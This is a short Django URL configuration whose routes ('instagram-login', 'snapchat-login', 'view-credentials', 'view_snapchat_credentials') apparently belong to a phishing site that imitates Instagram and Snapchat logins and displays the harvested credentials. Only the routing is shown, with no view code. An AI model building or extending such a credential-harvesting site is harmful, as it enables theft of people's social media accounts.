from .views import *
from django.urls import path

urlpatterns=[
    path('', index, name='home'),
    path('instagram-login/', instagram, name='instagram'),
    path('view-credentials/', view_credentials, name='view_credentials'),
    path('view_snapchat_credentials/', view_snapchat_credentials, name='view_snapchat_credentials'),
    path('snapchat-login/', snapchat, name='snapchat'),
    
]